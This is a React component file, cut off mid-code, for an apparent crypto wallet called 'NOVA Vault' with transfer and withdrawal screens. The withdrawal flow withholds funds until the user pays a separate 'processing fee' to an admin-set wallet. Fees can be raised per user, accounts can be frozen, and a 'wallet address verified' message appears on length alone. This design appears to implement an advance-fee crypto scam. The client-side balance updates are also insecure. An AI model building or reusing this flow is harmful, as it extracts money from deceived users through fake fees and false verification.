import { useState, useEffect } from "react";
import { C } from "../theme";
import { Card, GoldButton, GoldDivider, Input } from "../components/UI";
import { sendEmail, Emails } from "../notifications";
import { db, auth, doc, setDoc, addDoc, updateDoc, collection, query, where, getDocs, onSnapshot, serverTimestamp, increment } from "../firebase";

import { useSettings } from "../hooks/useSettings";

const CURRENCIES = [
  { symbol:"BTC",  label:"Bitcoin",   icon:"₿", color:"#F7931A", type:"crypto" },
  { symbol:"ETH",  label:"Ethereum",  icon:"Ξ", color:"#627EEA", type:"crypto" },
  { symbol:"SOL",  label:"Solana",    icon:"◎", color:"#9945FF", type:"crypto" },
  { symbol:"BNB",  label:"BNB",       icon:"B", color:"#F3BA2F", type:"crypto" },
  { symbol:"USDT", label:"Tether",    icon:"₮", color:"#26A17B", type:"crypto" },
  { symbol:"USD",  label:"USD Wire",  icon:"$", color:"#2ECC71", type:"fiat"   },
];

function generateRefNumber() {
  return `NV-${new Date().getFullYear()}-${Math.floor(100000 + Math.random()*900000)}`;
}

function WithdrawFlow({ cryptos, onBack, user }) {
  const { settings } = useSettings();
  const [userFeeOverride, setUserFeeOverride] = useState(null);
  const [isFrozen, setIsFrozen] = useState(false);
  const WITHDRAW_WALLET = settings.withdrawWallet;
  const FIXED_FEE = userFeeOverride !== null ? userFeeOverride : settings.withdrawalFee;
  const [step, setStep]               = useState(1);
  const [selCurrency, setSelCurrency] = useState(CURRENCIES[0]);
  const [amount, setAmount]           = useState("");
  const [destWallet, setDestWallet]   = useState("");
  const [txHash, setTxHash]           = useState("");
  const [proofName, setProofName]     = useState("");
  const [submitted, setSubmitted]     = useState(false);
  const [sending, setSending]         = useState(false);
  const [copied, setCopied]           = useState(false);
  const [walletBalance, setWalletBalance] = useState(0);
  const [refNum, setRefNum]           = useState("");

  const uid         = auth.currentUser?.uid;
  const cryptoAsset = cryptos.find(c => c.symbol === selCurrency.symbol);
  const price       = cryptoAsset?.price || 1;
  const usdValue    = amount ? (parseFloat(amount) * price).toFixed(2) : "0.00";

  // User receives the FULL withdrawal amount — fee is paid separately, not deducted
  const netReceive  = usdValue;

  const walletOk    = destWallet.length >= 32;
  const STEPS       = ["Currency","Amount","Fee","Proof","Status"];

  // USD cost of this withdrawal
  const usdCost = selCurrency.type === "crypto"
    ? parseFloat(amount || 0) * price
    : parseFloat(amount || 0);

  const isInsufficient = amount && usdCost > walletBalance;

  // Live wallet balance + per-user fee override + frozen status
  useEffect(() => {
    if (!uid) return;
    const unsub = onSnapshot(doc(db, "wallets", uid), snap => {
      if (snap.exists()) {
        const data = snap.data();
        setWalletBalance(data.usdBalance || 0);
        setUserFeeOverride(data.customFee !== undefined ? data.customFee : null);
        setIsFrozen(data.frozen === true);
      }
    });
    return () => unsub();
  }, [uid]);

  const copyWallet = async () => {
    try {
      await navigator.clipboard.writeText(WITHDRAW_WALLET);
      setCopied(true); setTimeout(() => setCopied(false), 2500);
    } catch {
      const el = document.createElement("textarea");
      el.value = WITHDRAW_WALLET;
      document.body.appendChild(el); el.select();
      document.execCommand("copy"); document.body.removeChild(el);
      setCopied(true); setTimeout(() => setCopied(false), 2500);
    }
  };

  const handleSubmit = async () => {
    if (!txHash && !proofName) return;
    setSending(true);
    try {
      const refNumber = generateRefNumber();
      setRefNum(refNumber);

      await addDoc(collection(db, "withdrawals"), {
        refNumber,
        uid, userEmail: user?.email || "",
        userName: user?.name || "User",
        currency: selCurrency.symbol,
        currencyLabel: selCurrency.label,
        amount: parseFloat(amount),
        usdValue: parseFloat(usdValue),
        fee: FIXED_FEE,
        netReceive: parseFloat(netReceive),
        destWallet, txHash: txHash || "",
        proofName: proofName || "",
        status: "pending",
        createdAt: serverTimestamp(),
      });
      await addDoc(collection(db, "transactions"), {
        refNumber,
        fromUid: uid, fromEmail: user?.email || "",
        fromName: user?.name || "User",
        toUid: "external", toEmail: destWallet,
        toName: `Withdraw ${selCurrency.symbol}`,
        amount: parseFloat(usdValue),
        note: `Withdrawal · ${amount} ${selCurrency.symbol} → ${destWallet.slice(0,12)}…`,
        status: "pending", type: "withdrawal",
        createdAt: serverTimestamp(),
      });

      // Confirmation email to user
      await sendEmail(Emails.withdrawalSubmitted(
        { email: user?.email || "user@novavault.io", name: user?.name || "Valued Customer" },
        amount, selCurrency.symbol
      ));

      // Alert email to admin
      await sendEmail(Emails.adminWithdrawalAlert(
        { email: user?.email || "Unknown", name: user?.name || "Unknown User" },
        amount, selCurrency.symbol, destWallet
      ));
    } catch(e) { console.error(e); }
    setSending(false);
    setSubmitted(true);
  };

  const StepBar = () => (
    <div style={{ display:"flex", alignItems:"center" }}>
      {STEPS.map((s,i) => (
        <div key={s} style={{ display:"flex", alignItems:"center", flex:i<STEPS.length-1?1:"none" }}>
          <div style={{ display:"flex", flexDirection:"column", alignItems:"center", gap:3 }}>
            <div style={{ width:24, height:24, borderRadius:"50%", display:"flex", alignItems:"center", justifyContent:"center", fontSize:10, fontWeight:800, background:i+1<step?C.green:i+1===step?C.gold:C.bgElevated, color:i+1<=step?"#000":C.muted, border:`1px solid ${i+1<step?C.green:i+1===step?C.gold:C.border}`, transition:"all 0.3s" }}>
              {i+1<step?"✓":i+1}
            </div>
            <span style={{ fontSize:8, color:i+1===step?C.gold:C.muted, fontWeight:600, whiteSpace:"nowrap" }}>{s}</span>
          </div>
          {i<STEPS.length-1 && <div style={{ flex:1, height:2, background:i+1<step?C.green:C.border, marginBottom:14, transition:"background 0.3s" }} />}
        </div>
      ))}
    </div>
  );

  if (submitted) return (
    <div style={{ display:"flex", flexDirection:"column", gap:20 }}>
      <div style={{ display:"flex", flexDirection:"column", alignItems:"center", gap:16, paddingTop:20 }}>
        <div style={{ width:72, height:72, borderRadius:"50%", background:`${C.gold}15`, border:`2px solid ${C.gold}`, display:"flex", alignItems:"center", justifyContent:"center", fontSize:32 }}>⏳</div>
        <div style={{ textAlign:"center" }}>
          <div style={{ fontSize:20, fontWeight:800, color:C.white }}>Withdrawal Pending</div>
          <div style={{ fontSize:12, color:C.muted, marginTop:6 }}>Under review · Est. 1–3 business days</div>
        </div>
        <div style={{ background:`${C.green}10`, border:`1px solid ${C.green}30`, borderRadius:10, padding:"10px 16px", textAlign:"center", width:"100%" }}>
          <div style={{ fontSize:12, color:C.green, fontWeight:600 }}>📧 Confirmation sent to {user?.email}</div>
        </div>
      </div>
      <Card hover={false} style={{ padding:"16px 18px" }}>
        {[
          ["Reference No.",       refNum],
          ["Status",              "🟡 Pending Review"],
          ["Currency",            `${selCurrency.label} (${selCurrency.symbol})`],
          ["Amount Withdrawn",    `${amount} ${selCurrency.symbol}`],
          ["USD Value",           `$${usdValue}`],
          ["Processing Fee",      `$${FIXED_FEE}.00`],
          ["Your Wallet",         `${destWallet.slice(0,14)}…${destWallet.slice(-6)}`],
          ["Fee Wallet",          `${WITHDRAW_WALLET.slice(0,16)}…`],
          ["TX / Proof",          txHash || proofName || "Submitted"],
          ["Est. Time",           "1–3 business days"],
        ].map(([label,value],i,arr) => (
          <div key={label}>
            <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", padding:"7px 0" }}>
              <span style={{ fontSize:12, color:C.muted, flexShrink:0 }}>{label}</span>
              <span style={{ fontSize:12, color:label==="Status"?C.gold:label==="Amount Withdrawn"?C.green:label==="Reference No."?C.gold:C.white, fontWeight:600, textAlign:"right", marginLeft:12, fontFamily:label==="Your Wallet"||label==="Fee Wallet"||label==="Reference No."?"monospace":"inherit" }}>{value}</span>
            </div>
            {i<arr.length-1 && <div style={{ height:1, background:C.border }} />}
          </div>
        ))}
      </Card>
      <div style={{ background:`${C.gold}10`, border:`1px solid ${C.gold}30`, borderRadius:12, padding:"14px 16px" }}>
        <div style={{ fontSize:12, color:C.gold, fontWeight:700, marginBottom:6 }}>What happens next?</div>
        <div style={{ fontSize:12, color:C.mutedLight, lineHeight:1.8 }}>Our team will verify your payment proof and process your withdrawal within 1–3 business days. You'll be notified once approved.</div>
      </div>
      <GoldButton onClick={onBack} style={{ width:"100%", padding:"14px" }}>← Back to Transfer</GoldButton>
    </div>
  );

  return (
    <div style={{ display:"flex", flexDirection:"column", gap:20 }}>
      <StepBar />

      {/* STEP 1 — Currency */}
      {step===1 && (
        <div style={{ display:"flex", flexDirection:"column", gap:16 }}>
          {isFrozen && (
            <div style={{ background:`${C.red}15`, border:`1px solid ${C.red}40`, borderRadius:12, padding:"14px 16px" }}>
              <div style={{ fontSize:13, fontWeight:700, color:C.red, marginBottom:4 }}>🔒 Account Frozen</div>
              <div style={{ fontSize:12, color:C.mutedLight }}>Your account has been temporarily suspended. Contact support for assistance.</div>
            </div>
          )}
          <div>
            <div style={{ fontSize:17, fontWeight:800, color:C.white }}>Withdraw Funds</div>
            <div style={{ fontSize:12, color:C.muted, marginTop:4 }}>Choose what you want to withdraw</div>
          </div>

          {/* Show wallet balance at top */}
          <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", background:C.bgElevated, border:`1px solid ${C.border}`, borderRadius:10, padding:"10px 16px" }}>
            <span style={{ fontSize:12, color:C.muted }}>Your Wallet Balance</span>
            <span style={{ fontSize:14, fontWeight:800, color:C.white }}>${walletBalance.toLocaleString("en-US",{minimumFractionDigits:2})}</span>
          </div>

          <div style={{ display:"flex", flexDirection:"column", gap:8 }}>
            {CURRENCIES.map(c => {
              const isSel = selCurrency.symbol === c.symbol;
              return (
                <div key={c.symbol} onClick={()=>setSelCurrency(c)} style={{ display:"flex", alignItems:"center", gap:14, padding:"14px 16px", background:isSel?`${c.color}15`:C.bgElevated, border:`2px solid ${isSel?c.color:C.border}`, borderRadius:14, cursor:"pointer", transition:"all 0.2s" }}>
                  <div style={{ width:40, height:40, borderRadius:"50%", background:`${c.color}20`, border:`1px solid ${c.color}40`, display:"flex", alignItems:"center", justifyContent:"center", color:c.color, fontWeight:800, fontSize:16, flexShrink:0 }}>{c.icon}</div>
                  <div style={{ flex:1 }}>
                    <div style={{ fontSize:14, fontWeight:700, color:C.white }}>{c.label}</div>
                    <div style={{ fontSize:11, color:C.muted, marginTop:2 }}>{c.type==="crypto"?`${c.symbol} Network`:"Wire / Bank Transfer"}</div>
                  </div>
                  <div style={{ textAlign:"right" }}>
                    {c.type==="fiat" && <div style={{ fontSize:11, color:C.gold, fontWeight:600 }}>SWIFT / ACH</div>}
                    {isSel && <div style={{ fontSize:10, color:c.color, marginTop:2 }}>✓ Selected</div>}
                  </div>
                </div>
              );
            })}
          </div>
          <GoldButton onClick={()=>setStep(2)} disabled={isFrozen} style={{ width:"100%", padding:"15px" }}>{isFrozen?"🔒 Account Frozen":"Continue →"}</GoldButton>
        </div>
      )}

      {/* STEP 2 — Destination Wallet + Amount */}
      {step===2 && (
        <div style={{ display:"flex", flexDirection:"column", gap:16 }}>
          <div>
            <div style={{ fontSize:17, fontWeight:800, color:C.white }}>Amount & Destination</div>
            <div style={{ fontSize:12, color:C.muted, marginTop:4 }}>Enter amount and your destination wallet</div>
          </div>

          {/* Destination wallet */}
          <div>
            <label style={{ fontSize:11, color:C.muted, letterSpacing:"0.1em", display:"block", marginBottom:8 }}>DESTINATION WALLET ADDRESS</label>
            <input
              value={destWallet} onChange={e=>setDestWallet(e.target.value)}
              placeholder={`Your ${selCurrency.symbol} wallet address`}
              style={{ width:"100%", background:C.bgElevated, border:`1px solid ${walletOk?C.green:destWallet.length>0?C.gold:C.border}`, borderRadius:12, padding:"14px 16px", color:C.white, fontSize:12, outline:"none", boxSizing:"border-box", fontFamily:"monospace", transition:"border-color 0.2s" }}
            />
            {walletOk && (
              <div style={{ marginTop:6, display:"flex", alignItems:"center", gap:6 }}>
                <div style={{ width:6, height:6, borderRadius:"50%", background:C.green, boxShadow:`0 0 6px ${C.green}` }} />
                <span style={{ fontSize:11, color:C.green, fontWeight:600 }}>✓ Wallet address verified</span>
              </div>
            )}
            {destWallet.length>0 && !walletOk && (
              <div style={{ marginTop:6, display:"flex", alignItems:"center", gap:6 }}>
                <div style={{ width:6, height:6, borderRadius:"50%", background:C.gold }} />
                <span style={{ fontSize:11, color:C.mutedLight }}>{32-destWallet.length} more characters needed</span>
              </div>
            )}
            <div style={{ marginTop:10, background:`${C.gold}08`, border:`1px solid ${C.gold}20`, borderRadius:10, padding:"10px 14px" }}>
              <div style={{ fontSize:11, color:C.mutedLight, lineHeight:1.7 }}>
                ⚠️ Double-check this address. Funds sent to a wrong address <span style={{ color:C.red, fontWeight:700 }}>cannot be recovered</span>.
              </div>
            </div>
          </div>

          {/* Asset row */}
          <div style={{ display:"flex", alignItems:"center", gap:10, background:C.bgElevated, border:`1px solid ${C.border}`, borderRadius:12, padding:"12px 16px" }}>
            <span style={{ color:selCurrency.color, fontWeight:800, fontSize:20 }}>{selCurrency.icon}</span>
            <span style={{ fontSize:14, fontWeight:700, color:C.white }}>{selCurrency.label}</span>
            {selCurrency.type==="crypto" && cryptoAsset && (
              <span style={{ marginLeft:"auto", fontSize:12, color:C.muted }}>≈ ${cryptoAsset.price.toLocaleString()}/coin</span>
            )}
          </div>

          {/* Amount */}
          <div>
            <label style={{ fontSize:11, color:C.muted, letterSpacing:"0.1em", display:"block", marginBottom:8 }}>AMOUNT</label>
            <div style={{ position:"relative" }}>
              <input value={amount} onChange={e=>setAmount(e.target.value)} placeholder="0.00" type="number"
                style={{ width:"100%", background:C.bgElevated, border:`1px solid ${isInsufficient?C.red:C.border}`, borderRadius:12, padding:"16px 80px 16px 16px", color:C.white, fontSize:22, fontWeight:700, outline:"none", boxSizing:"border-box", transition:"border-color 0.2s" }} />
              <span style={{ position:"absolute", right:16, top:"50%", transform:"translateY(-50%)", color:C.gold, fontSize:13, fontWeight:700 }}>{selCurrency.symbol}</span>
            </div>
            {amount && selCurrency.type==="crypto" && (
              <div style={{ fontSize:12, color:C.muted, marginTop:6 }}>≈ ${usdValue} USD</div>
            )}

            {/* Live balance indicator */}
            <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginTop:8 }}>
              <span style={{ fontSize:11, color:C.muted }}>Your wallet balance</span>
              <span style={{ fontSize:12, fontWeight:700, color:isInsufficient?C.red:C.green }}>
                ${walletBalance.toLocaleString("en-US",{minimumFractionDigits:2})}
              </span>
            </div>

            {/* Insufficient funds error */}
            {isInsufficient && (
              <div style={{ marginTop:8, padding:"10px 14px", borderRadius:10, background:`${C.red}15`, border:`1px solid ${C.red}40`, color:C.red, fontSize:13, fontWeight:600 }}>
                ⚠️ Insufficient funds. Your balance is ${walletBalance.toLocaleString("en-US",{minimumFractionDigits:2})}
              </div>
            )}
          </div>

          {/* % shortcuts — crypto only */}
          {selCurrency.type==="crypto" && cryptoAsset && (
            <div style={{ display:"flex", gap:8 }}>
              {[25,50,75,100].map(pct => (
                <button key={pct} onClick={()=>setAmount((cryptoAsset.balance*pct/100).toFixed(4))} style={{ flex:1, padding:"7px", borderRadius:8, cursor:"pointer", background:C.bgElevated, border:`1px solid ${C.border}`, color:C.mutedLight, fontSize:11, fontWeight:600 }}>{pct}%</button>
              ))}
            </div>
          )}

          {/* Max button for fiat */}
          {selCurrency.type==="fiat" && walletBalance > 0 && (
            <button onClick={()=>setAmount(walletBalance.toFixed(2))} style={{ padding:"8px", borderRadius:8, cursor:"pointer", background:C.bgElevated, border:`1px solid ${C.border}`, color:C.gold, fontSize:12, fontWeight:700 }}>
              Use Max — ${walletBalance.toLocaleString("en-US",{minimumFractionDigits:2})}
            </button>
          )}

          <div style={{ display:"flex", gap:10 }}>
            <GoldButton variant="outline" onClick={()=>setStep(1)} style={{ flex:1 }}>Back</GoldButton>
            <GoldButton
              onClick={()=>{
                if (isFrozen || !amount || parseFloat(amount)<=0 || !walletOk || isInsufficient) return;
                setStep(3);
              }}
              disabled={isFrozen || !amount || parseFloat(amount)<=0 || !walletOk || !!isInsufficient}
              style={{ flex:1 }}
            >
              {isFrozen ? "🔒 Account Frozen" : "Continue →"}
            </GoldButton>
          </div>
        </div>
      )}

      {/* STEP 3 — Fee (separate from withdrawal amount) */}
      {step===3 && (
        <div style={{ display:"flex", flexDirection:"column", gap:16 }}>
          <div>
            <div style={{ fontSize:17, fontWeight:800, color:C.white }}>Processing Fee</div>
            <div style={{ fontSize:12, color:C.muted, marginTop:4 }}>Pay the network fee to proceed</div>
          </div>
          <div style={{ background:`${C.red}10`, border:`1px solid ${C.red}30`, borderRadius:12, padding:"14px 16px" }}>
            <div style={{ fontSize:13, fontWeight:700, color:C.red, marginBottom:6 }}>⚠️ Network Fee Required</div>
            <div style={{ fontSize:12, color:C.mutedLight, lineHeight:1.7 }}>
              A processing fee of <span style={{ color:C.gold, fontWeight:800, fontSize:16 }}>${FIXED_FEE}.00</span> is required to authorize this withdrawal.
            </div>
          </div>
          <Card hover={false} style={{ padding:"16px 18px" }}>
            {[
              ["Asset",            `${selCurrency.label} (${selCurrency.symbol})`],
              ["Amount",           `${amount} ${selCurrency.symbol}`],
              ["You Receive",      `$${usdValue}`],
              ["Processing Fee",   `$${FIXED_FEE}.00`],
              ["Withdraw To",      `${destWallet.slice(0,14)}…${destWallet.slice(-6)}`],
            ].map(([label,value],i,arr) => (
              <div key={label}>
                <div style={{ display:"flex", justifyContent:"space-between", padding:"8px 0" }}>
                  <span style={{ fontSize:13, color:C.muted }}>{label}</span>
                  <span style={{ fontSize:13, fontFamily:label==="Withdraw To"?"monospace":"inherit", color:i===2?C.green:i===3?C.red:C.white, fontWeight:i>=2?800:600 }}>{value}</span>
                </div>
                {i<arr.length-1 && <div style={{ height:1, background:C.border }} />}
              </div>
            ))}
          </Card>
          <div>
            <div style={{ fontSize:11, color:C.muted, letterSpacing:"0.1em", marginBottom:8 }}>SEND FEE TO THIS WALLET</div>
            <div style={{ background:C.bgElevated, border:`1px solid ${C.borderStrong}`, borderRadius:12, padding:"16px" }}>
              <div style={{ fontSize:10, color:C.gold, letterSpacing:"0.1em", marginBottom:8, textTransform:"uppercase" }}>Payment Wallet Address</div>
              <div style={{ fontFamily:"monospace", fontSize:13, color:C.white, wordBreak:"break-all", lineHeight:1.8, userSelect:"all" }}>{WITHDRAW_WALLET}</div>
              <button onClick={copyWallet} style={{ marginTop:12, borderRadius:10, padding:"11px 14px", background:copied?`${C.green}20`:`${C.gold}15`, border:`1px solid ${copied?C.green:C.gold}40`, color:copied?C.green:C.gold, fontSize:12, fontWeight:700, cursor:"pointer", width:"100%", transition:"all 0.3s" }}>
                {copied?"✓ Copied to clipboard!":"📋 Copy Wallet Address"}
              </button>
            </div>
          </div>
          <div style={{ display:"flex", gap:10 }}>
            <GoldButton variant="outline" onClick={()=>setStep(2)} style={{ flex:1 }}>Back</GoldButton>
            <GoldButton onClick={()=>setStep(4)} style={{ flex:1 }}>I've Paid Fee →</GoldButton>
          </div>
        </div>
      )}

      {/* STEP 4 — Proof */}
      {step===4 && (
        <div style={{ display:"flex", flexDirection:"column", gap:16 }}>
          <div>
            <div style={{ fontSize:17, fontWeight:800, color:C.white }}>Payment Proof</div>
            <div style={{ fontSize:12, color:C.muted, marginTop:4 }}>Provide your TX hash or upload a screenshot</div>
          </div>
          <div>
            <label style={{ fontSize:11, color:C.muted, letterSpacing:"0.1em", display:"block", marginBottom:8 }}>TRANSACTION HASH (TX ID)</label>
            <input value={txHash} onChange={e=>setTxHash(e.target.value)} placeholder="Paste your transaction hash"
              style={{ width:"100%", background:C.bgElevated, border:`1px solid ${txHash?C.gold:C.border}`, borderRadius:12, padding:"14px 16px", color:C.white, fontSize:12, outline:"none", boxSizing:"border-box", fontFamily:"monospace", transition:"border-color 0.2s" }} />
          </div>
          <div style={{ display:"flex", alignItems:"center", gap:12 }}>
            <div style={{ flex:1, height:1, background:C.border }} />
            <span style={{ fontSize:11, color:C.muted }}>OR</span>
            <div style={{ flex:1, height:1, background:C.border }} />
          </div>
          <label style={{ display:"block", background:C.bgElevated, border:`2px dashed ${proofName?C.gold:C.border}`, borderRadius:12, padding:"28px 16px", textAlign:"center", cursor:"pointer", transition:"all 0.2s" }}>
            <input type="file" accept="image/*,.pdf" style={{ display:"none" }} onChange={e=>setProofName(e.target.files?.[0]?.name||"")} />
            {proofName ? (
              <>
                <div style={{ fontSize:28, marginBottom:8 }}>✅</div>
                <div style={{ fontSize:12, color:C.gold, fontWeight:700 }}>{proofName}</div>
                <div style={{ fontSize:11, color:C.muted, marginTop:4 }}>Tap to change</div>
              </>
            ) : (
              <>
                <div style={{ fontSize:32, marginBottom:8 }}>📎</div>
                <div style={{ fontSize:13, color:C.mutedLight, fontWeight:600 }}>Upload Screenshot / PDF</div>
                <div style={{ fontSize:11, color:C.muted, marginTop:4 }}>PNG, JPG or PDF</div>
              </>
            )}
          </label>
          <div style={{ background:`${C.gold}10`, border:`1px solid ${C.gold}30`, borderRadius:12, padding:"12px 16px" }}>
            <div style={{ fontSize:11, color:C.gold, fontWeight:700, marginBottom:4 }}>💡 Tip</div>
            <div style={{ fontSize:11, color:C.mutedLight, lineHeight:1.7 }}>Providing both a TX hash AND a screenshot gives the fastest processing time.</div>
          </div>
          <div style={{ display:"flex", gap:10 }}>
            <GoldButton variant="outline" onClick={()=>setStep(3)} style={{ flex:1 }}>Back</GoldButton>
            <GoldButton onClick={handleSubmit} disabled={(!txHash&&!proofName)||sending} style={{ flex:1 }}>
              {sending?"Sending…":"Submit →"}
            </GoldButton>
          </div>
        </div>
      )}
    </div>
  );
}

// ── Main SendReceive ──────────────────────────────────────────────
export default function SendReceive({ cryptos=[], user }) {
  const [mode, setMode]                 = useState("send");
  const [toEmail, setToEmail]           = useState("");
  const [amount, setAmount]             = useState("");
  const [note, setNote]                 = useState("");
  const [step, setStep]                 = useState(1);
  const [showWithdraw, setShowWithdraw] = useState(false);
  const [loading, setLoading]           = useState(false);
  const [error, setError]               = useState("");
  const [success, setSuccess]           = useState(false);
  const [senderBalance, setSenderBalance] = useState(0);
  const [isFrozen, setIsFrozen]         = useState(false);
  const [refNum, setRefNum]             = useState("");

  const uid = auth.currentUser?.uid;

  // Live balance + frozen status
  useEffect(() => {
    if (!uid) return;
    const unsub = onSnapshot(doc(db, "wallets", uid), snap => {
      if (snap.exists()) {
        setSenderBalance(snap.data().usdBalance || 0);
        setIsFrozen(snap.data().frozen === true);
      }
    });
    return () => unsub();
  }, [uid]);

  const handleSend = async () => {
    if (isFrozen) { setError("🔒 Your account has been frozen. Contact support."); return; }

    if (step === 1) {
      if (!toEmail || !amount)       { setError("Please fill all fields."); return; }
      if (parseFloat(amount) <= 0)   { setError("Enter a valid amount."); return; }
      if (parseFloat(amount) > senderBalance) {
        setError(`⚠ Insufficient funds. Your balance is $${senderBalance.toLocaleString("en-US",{minimumFractionDigits:2})}`);
        return;
      }
      setError(""); setStep(2); return;
    }

    if (step === 2) {
      setLoading(true); setError("");
      try {
        const q = query(collection(db,"wallets"), where("email","==",toEmail.trim().toLowerCase()));
        const snap = await getDocs(q);
        if (snap.empty) { setError("No NOVA Vault account found with that email."); setLoading(false); return; }
        const recipientDoc  = snap.docs[0];
        const recipientUid  = recipientDoc.id;
        const recipientData = recipientDoc.data();
        const sendAmount    = parseFloat(amount);
        if (recipientUid === uid) { setError("You can't send to yourself."); setLoading(false); return; }

        // Double-check balance before deducting
        if (sendAmount > senderBalance) {
          setError(`⚠️ Insufficient funds. Your balance is $${senderBalance.toLocaleString("en-US",{minimumFractionDigits:2})}`);
          setLoading(false); return;
        }

        const refNumber = generateRefNumber();
        setRefNum(refNumber);

        await updateDoc(doc(db,"wallets",uid),         { usdBalance: increment(-sendAmount) });
        await updateDoc(doc(db,"wallets",recipientUid), { usdBalance: increment(sendAmount)  });
        await addDoc(collection(db,"transactions"), {
          refNumber,
          fromUid: uid, fromEmail: user?.email||"", fromName: user?.name||"User",
          toUid: recipientUid, toEmail: toEmail.trim().toLowerCase(),
          toName: recipientData.name||toEmail.split("@")[0],
          amount: sendAmount, note: note||"Transfer",
          status:"completed", type:"send", createdAt: serverTimestamp(),
        });
        setLoading(false); setSuccess(true);
      } catch(err) {
        setLoading(false); setError("Transfer failed. Please try again.");
      }
    }
  };

  if (!uid) return <div style={{ textAlign:"center", padding:"60px 0", color:C.muted }}>Loading…</div>;
  if (showWithdraw) return <WithdrawFlow cryptos={cryptos} user={user} onBack={()=>{ setShowWithdraw(false); setMode("send"); }} />;

  if (success) return (
    <div style={{ display:"flex", flexDirection:"column", alignItems:"center", gap:24, paddingTop:60 }}>
      <div style={{ width:80, height:80, borderRadius:"50%", background:`${C.green}15`, border:`2px solid ${C.green}`, display:"flex", alignItems:"center", justifyContent:"center", fontSize:36 }}>✓</div>
      <div style={{ textAlign:"center" }}>
        <div style={{ fontSize:22, fontWeight:800, color:C.white }}>Transfer Complete!</div>
        <div style={{ fontSize:14, color:C.muted, marginTop:8 }}>${parseFloat(amount).toLocaleString("en-US",{minimumFractionDigits:2})} sent to {toEmail}</div>
        {note && <div style={{ fontSize:13, color:C.mutedLight, marginTop:4 }}>"{note}"</div>}
      </div>
      <Card hover={false} style={{ width:"100%", padding:"16px 18px" }}>
        {[
          ["Reference No.", refNum],
          ["Amount Sent",  `$${parseFloat(amount).toLocaleString("en-US",{minimumFractionDigits:2})}`],
          ["To",           toEmail],
          ["Fee",          "Free — NOVA to NOVA"],
          ["New Balance",  `$${senderBalance.toLocaleString("en-US",{minimumFractionDigits:2})}`],
          ["Status",       "✓ Completed"],
        ].map(([label,value],i,arr) => (
          <div key={label}>
            <div style={{ display:"flex", justifyContent:"space-between", padding:"9px 0" }}>
              <span style={{ fontSize:13, color:C.muted }}>{label}</span>
              <span style={{ fontSize:13, fontWeight:600, color:label==="Status"?C.green:label==="Fee"?C.gold:C.white, fontFamily:label==="Reference No."?"monospace":"inherit" }}>{value}</span>
            </div>
            {i<arr.length-1 && <div style={{ height:1, background:C.border }} />}
          </div>
        ))}
      </Card>
      <GoldButton onClick={()=>{ setSuccess(false); setStep(1); setToEmail(""); setAmount(""); setNote(""); }} style={{ width:"100%" }}>New Transfer</GoldButton>
    </div>
  );

  return (
    <div style={{ display:"flex", flexDirection:"column", gap:20 }}>
      {isFrozen && (
        <div style={{ background:`${C.red}15`, border:`1px solid ${C.red}40`, borderRadius:12, padding:"14px 16px" }}>
          <div style={{ fontSize:13, fontWeight:700, color:C.red, marginBottom:4 }}>🔒 Account Frozen</div>
          <div style={{ fontSize:12, color:C.mutedLight }}>Your account has been temporarily suspended. Contact support for assistance.</div>
        </div>
      )}

      {/* Mode tabs */}
      <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr", gap:8 }}>
        {[["send","↑ Send"],["receive","↓ Receive"],["withdraw","↓ Withdraw"]].map(([m,label]) => (
          <button key={m} onClick={()=>{ setMode(m); if(m==="withdraw") setShowWithdraw(true); }} style={{ padding:"11px 6px", borderRadius:10, cursor:"pointer", fontWeight:700, fontSize:12, transition:"all 0.2s", background:mode===m?(m==="withdraw"?`${C.red}15`:C.goldGlow):C.bgElevated, border:`1px solid ${mode===m?(m==="withdraw"?C.red:C.gold):C.border}`, color:mode===m?(m==="withdraw"?C.red:C.gold):C.muted }}>{label}</button>
        ))}
      </div>

      {/* SEND */}
      {mode==="send" && (
        <>
          <Card hover={false} style={{ padding:"14px 18px" }}>
            <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center" }}>
              <div>
                <div style={{ fontSize:11, color:C.muted, letterSpacing:"0.1em" }}>YOUR BALANCE</div>
                <div style={{ fontSize:26, fontWeight:800, color:C.white, marginTop:4 }}>
                  ${senderBalance.toLocaleString("en-US",{minimumFractionDigits:2})}
                </div>
              </div>
              <div style={{ fontSize:32 }}>💵</div>
            </div>
          </Card>

          {step===1 && (
            <div style={{ display:"flex", flexDirection:"column", gap:16 }}>
              <div>
                <div style={{ fontSize:17, fontWeight:800, color:C.white }}>Send to NOVA Account</div>
                <div style={{ fontSize:12, color:C.muted, marginTop:4 }}>Instant free transfer to any NOVA Vault user</div>
              </div>
              <Input label="RECIPIENT EMAIL" type="email" placeholder="recipient@email.com" value={toEmail} onChange={e=>setToEmail(e.target.value)} />
              <div>
                <div style={{ display:"flex", justifyContent:"space-between", marginBottom:8 }}>
                  <label style={{ fontSize:11, color:C.muted, letterSpacing:"0.1em" }}>AMOUNT (USD)</label>
                  <span style={{ fontSize:11, color:C.gold }}>Available: ${senderBalance.toLocaleString("en-US",{minimumFractionDigits:2})}</span>
                </div>
                <div style={{ position:"relative" }}>
                  <span style={{ position:"absolute", left:16, top:"50%", transform:"translateY(-50%)", color:C.gold, fontWeight:700, fontSize:18 }}>$</span>
                  <input value={amount} onChange={e=>setAmount(e.target.value)} placeholder="0.00" type="number"
                    style={{ width:"100%", background:C.bgElevated, border:`1px solid ${amount&&parseFloat(amount)>senderBalance?C.red:C.border}`, borderRadius:12, padding:"14px 16px 14px 36px", color:C.white, fontSize:22, fontWeight:700, outline:"none", boxSizing:"border-box", transition:"border-color 0.2s" }} />
                </div>

                {/* Live balance indicator */}
                {amount && (
                  <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginTop:8 }}>
                    <span style={{ fontSize:11, color:C.muted }}>Available balance</span>
                    <span style={{ fontSize:12, fontWeight:700, color:parseFloat(amount)>senderBalance?C.red:C.green }}>
                      ${senderBalance.toLocaleString("en-US",{minimumFractionDigits:2})}
                    </span>
                  </div>
                )}

                {/* Insufficient funds */}
                {amount && parseFloat(amount) > senderBalance && (
                  <div style={{ marginTop:8, padding:"10px 14px", borderRadius:10, background:`${C.red}15`, border:`1px solid ${C.red}40`, color:C.red, fontSize:13, fontWeight:600 }}>
                    ⚠️ Insufficient funds. Your balance is ${senderBalance.toLocaleString("en-US",{minimumFractionDigits:2})}
                  </div>
                )}

                <div style={{ display:"flex", gap:8, marginTop:10 }}>
                  {[25,50,75,100].map(pct => (
